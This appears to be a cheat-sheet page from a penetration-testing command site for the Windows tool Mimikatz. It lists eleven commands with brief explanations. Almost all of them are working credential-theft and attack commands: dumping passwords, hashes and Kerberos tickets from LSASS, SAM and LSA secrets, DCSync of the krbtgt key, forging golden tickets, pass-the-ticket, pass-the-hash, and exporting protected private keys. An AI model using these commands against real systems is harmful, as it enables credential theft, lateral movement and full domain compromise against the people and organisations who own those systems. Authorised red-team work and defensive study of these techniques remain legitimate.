# Mimikatz

> The classic Windows post-exploitation tool for extracting plaintext passwords, hashes and Kerberos tickets from memory, and for pass-the-hash, pass-the-ticket and golden-ticket attacks.

- Category: Active Directory
- Commands: 11
- Page: https://terminal.rokibulroni.com/tool/active-directory/mimikatz
- Homepage: https://github.com/gentilkiwi/mimikatz
- Documentation: https://github.com/gentilkiwi/mimikatz/wiki
- Tags: Active Directory, credentials, Kerberos, post-exploitation

## Install

- other: `Download signed binaries from https://github.com/gentilkiwi/mimikatz/releases`

## Credentials

### privilege::debug

```bash
privilege::debug
```

Enables the debug privilege; most credential commands need it. Run mimikatz as administrator first.

### sekurlsa::logonpasswords

```bash
sekurlsa::logonpasswords
```

Dumps plaintext passwords, NT hashes and Kerberos tickets for logged-on users from LSASS memory.

### sekurlsa::ekeys

```bash
sekurlsa::ekeys
```

Extracts Kerberos encryption keys, including AES, from memory.

### lsadump::sam

```bash
lsadump::sam
```

Dumps local account hashes from the SAM.

### lsadump::lsa /patch

```bash
lsadump::lsa /patch
```

Dumps LSA secrets and cached domain credentials.


## Kerberos tickets

### sekurlsa::tickets /export

```bash
sekurlsa::tickets /export
```

Exports all Kerberos tickets in memory to .kirbi files for pass-the-ticket.

### kerberos::ptt <ticket>.kirbi

```bash
kerberos::ptt <ticket>.kirbi
```

Example:

```bash
kerberos::ptt ticket.kirbi
```

Injects a ticket into the current session (pass-the-ticket).

### lsadump::dcsync /domain:<domain> /user:<user>

```bash
lsadump::dcsync /domain:<domain> /user:<user>
```

Example:

```bash
lsadump::dcsync /domain:corp.local /user:krbtgt
```

DCSync: pulls a user’s hashes from a DC, famously the krbtgt key for golden tickets.

### kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<hash> /ptt

```bash
kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<hash> /ptt
```

Example:

```bash
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-111-222-333 /krbtgt:abc123 /ptt
```

Forges and injects a golden ticket from the krbtgt hash.


## Pass-the-hash

### sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:<cmd>

```bash
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:<cmd>
```

Example:

```bash
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe
```

Starts a process in the context of a user using only their NT hash.

### crypto::capi / crypto::cng

```bash
crypto::capi / crypto::cng
```

Makes non-exportable certificate private keys exportable.

## Related tools

- [Impacket](https://terminal.rokibulroni.com/tool/active-directory/impacket)
- [CrackMapExec / NetExec](https://terminal.rokibulroni.com/tool/lateral/crackmapexec)
- [Rubeus](https://terminal.rokibulroni.com/tool/active-directory/rubeus)
- [Certipy](https://terminal.rokibulroni.com/tool/active-directory/certipy)
